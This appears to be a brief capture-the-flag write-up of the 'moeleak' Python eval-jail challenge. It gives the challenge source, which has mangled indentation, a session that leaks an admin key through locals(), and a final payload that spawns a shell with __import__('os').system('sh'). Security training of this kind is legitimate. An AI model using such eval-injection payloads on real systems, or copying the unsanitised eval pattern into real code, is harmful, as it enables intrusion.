```python
fake_key_into_local_but_valid_key_into_remote = "moectfisbestctfhopeyoulikethat"
print("Hey Guys,Welcome to the moeleak challenge.Have fun!.")
print("| Options: \
|       [V]uln \
|       [B]ackdoor")
def func_filter(s):
    not_allowed = set('vvvveeee')
    return any(c in not_allowed for c in s)
while(1):
    challenge_choice = input(">>> ").lower().strip()
    if challenge_choice == 'v':
    code = input("code >> ")
    if(len(code)>9):
        print("you're hacker!")
        exit(0)
    if func_filter(code):
        print("Oh hacker! byte~")
        exit(0)
    print(eval(code))
    elif challenge_choice == 'b':
    print("Please enter the admin key")
    key = input("key >> ")
    if(key == fake_key_into_local_but_valid_key_into_remote):
        print("Hey Admin,please input your code:")
        code = input("backdoor >> ")
        print(eval(code))
    else:
    print("You should select valid choice!")
```

简单`locals`

```python
>>> e
Hey Guys,Welcome to the moeleak challenge.Have fun!.
| Options: 
|       [V]uln 
|       [B]ackdoor
>>> v
you need to 
code >> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f01230b0ac0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/./server.py', '__cached__': None, 'key_6366a131649a4e9b': '4e86eda06366a131649a4e9be1a9f217', 'WELCOME': "\n  __  __  ___       _      ______        _  __  _                _  ___  \n |  \\/  |/ _ \\     | |    |  ____| ____ | |/ / | |              | |/ _ \\ \n | \\  / | | | | ___| |    | |__   / __ \\| ' /  | | _____   _____| | | | |\n | |\\/| | | | |/ _ \\ |    |  __| / / _` |  <   | |/ _ \\ \\ / / _ \\ | | | |\n | |  | | |_| |  __/ |____| |___| | (_| | . \\  | |  __/\\ V /  __/ | |_| |\n |_|  |_|\\___/ \\___|______|______\\ \\__,_|_|\\_\\ |_|\\___| \\_/ \\___|_|\\___/ \n                                  \\____/                                 \n                                                                                                                                      \n", 'CHALLENGE_SOURCE_CODE': '\n    fake_key_into_local_but_valid_key_into_remote = "moectfisbestctfhopeyoulikethat"\n    print("Hey Guys,Welcome to the moeleak challenge.Have fun!.")\n    print("| Options: \n|\t[V]uln \n|\t[B]ackdoor")\n    def func_filter(s):\n      not_allowed = set(\'vvvveeee\')\n      return any(c in not_allowed for c in s)\n    while(1):\n      challenge_choice = input(">>> ").lower().strip()\n      if challenge_choice == \'v\':\n        code = input("code >> ")\n        if(len(code)>9):\n          print("you\'re hacker!")\n          exit(0)\n        if func_filter(code):\n          print("Oh hacker! byte~")\n          exit(0)\n        print(eval(code))\n      elif challenge_choice == \'b\':\n        print("Please enter the admin key")\n        key = input("key >> ")\n        if(key == fake_key_into_local_but_valid_key_into_remote):\n          print("Hey Admin,please input your code:")\n          code = input("backdoor >> ")\n          print(eval(code))\n      else:\n        print("You should select valid choice!")\n', 'choice': 'e', 'func_filter': <function func_filter at 0x7f01231120e0>, 'challenge_choice': 'v', 'code': 'locals()'}
>>> b
Please enter the admin key
key >> 4e86eda06366a131649a4e9be1a9f217
Hey Admin,please input your code:
backdoor> __import__("os").system("sh")
```